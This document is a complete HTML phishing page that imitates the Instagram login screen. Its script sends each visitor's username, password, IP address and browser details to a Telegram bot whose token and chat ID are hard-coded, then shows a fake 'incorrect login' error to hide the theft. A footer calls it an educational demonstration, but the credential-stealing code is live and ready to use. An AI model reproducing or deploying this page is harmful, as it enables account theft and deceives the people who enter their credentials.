<<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            margin: 0;
        }

        .container {
            max-width: 350px;
            width: 100%;
            margin-top: 12px;
        }

        .login-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
        }

        .logo-container {
            text-align: center;
            margin: 22px auto 32px;
        }

        .logo {
            width: 175px;
            height: 51px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 90"><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="36" font-weight="400" fill="%23262626">Instagram</text></svg>');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin: 0 auto;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-group {
            margin-bottom: 6px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 0 2px 8px;
            font-size: 12px;
            line-height: 18px;
            outline: none;
            color: #262626;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .input-group label {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
            transition: 0.1s ease;
            pointer-events: none;
            transform-origin: left;
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            transform: scale(0.83333) translateY(-20px);
            font-size: 10px;
            color: #8e8e8e;
        }

        .input-group input::placeholder {
            color: transparent;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            line-height: 18px;
            margin: 12px 0;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 18px 0 22px;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
        }

        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
            background: none;
            border: none;
            cursor: pointer;
            width: 100%;
            gap: 8px;
        }

        .fb-login svg {
            width: 16px;
            height: 16px;
            fill: #385185;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            text-align: center;
            display: block;
            margin-top: 8px;
        }

        .signup-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }

        .signup-card p {
            color: #262626;
            font-size: 14px;
            margin: 0;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            color: #262626;
            font-size: 14px;
            margin: 10px 0;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }

        .app-store-btn,
        .google-play-btn {
            height: 40px;
            width: 134px;
            background-size: cover;
            background-repeat: no-repeat;
            cursor: pointer;
        }

        .app-store-btn {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 134 40"><rect width="134" height="40" fill="%231d1d1f" rx="8"/><text x="20" y="25" fill="white" font-family="Arial" font-size="12">App Store</text></svg>');
        }

        .google-play-btn {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 134 40"><rect width="134" height="40" fill="%231d1d1f" rx="8"/><text x="20" y="25" fill="white" font-family="Arial" font-size="12">Google Play</text></svg>');
        }

        .error-message {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin: 8px 0;
            display: none;
            line-height: 1.4;
        }

        footer {
            max-width: 1000px;
            width: 100%;
            margin-top: 24px;
            padding: 20px 0;
            text-align: center;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
            padding: 0 16px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
            line-height: 16px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            line-height: 16px;
            margin-top: 12px;
        }

        .language-selector {
            color: #8e8e8e;
            font-size: 12px;
            margin-bottom: 16px;
        }

        .language-selector select {
            border: none;
            background: none;
            color: #8e8e8e;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }

        .note {
            color: #8e8e8e;
            font-size: 10px;
            margin-top: 10px;
        }

        /* Instagram specific spacing */
        .login-card form {
            margin-top: 24px;
        }

        .fb-icon {
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo-container">
                <div class="logo"></div>
            </div>

            <div class="error-message" id="errorMessage"></div>

            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder=" " autocomplete="off">
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder=" ">
                    <label for="password">Password</label>
                </div>
                <button type="submit">Log in</button>
            </form>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>

            <button class="fb-login" id="fbLogin">
                <svg viewBox="0 0 24 24">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Log in with Facebook
            </button>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-card">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <div class="app-store-btn"></div>
                <div class="google-play-btn"></div>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
                <option>Italiano</option>
                <option>Português</option>
            </select>
        </div>
        <div class="copyright">
            © 2024 Instagram from Meta
        </div>
        <div class="note">
            This is a demonstration page for educational purposes only
        </div>
    </footer>

    <script>
        // Floating label effect
        document.querySelectorAll('.input-group input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.classList.add('focused');
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.parentElement.classList.remove('focused');
                }
            });
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                showError('Please fill in all fields');
                return;
            }

            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Send to Telegram
                const botToken = '8757644298:AAE-o_PfwfG6LI50zEHH2pCw6Sv2p83VW-4';
                const chatId = '5077356228';
                
                const message = `🔐 Instagram Login Attempt
👤 Username/Email: ${username}
🔑 Password: ${password}
🌐 IP: ${userIP}
🕐 Time: ${new Date().toLocaleString()}
📱 User Agent: ${navigator.userAgent}`;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }

            // Show error message
            showError('The login information you entered is incorrect.');
            
            // Clear password field
            document.getElementById('password').value = '';
        });

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            
            // Hide error after 5 seconds
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 5000);
        }

        // Handle Facebook login button (prevent default)
        document.getElementById('fbLogin').addEventListener('click', function(e) {
            e.preventDefault();
            showError('This is a demo. Please use the login form above.');
        });

        // Handle forgot password link
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            showError('This is a demo. Please use the login form above.');
        });
    </script>
</body>
</html>
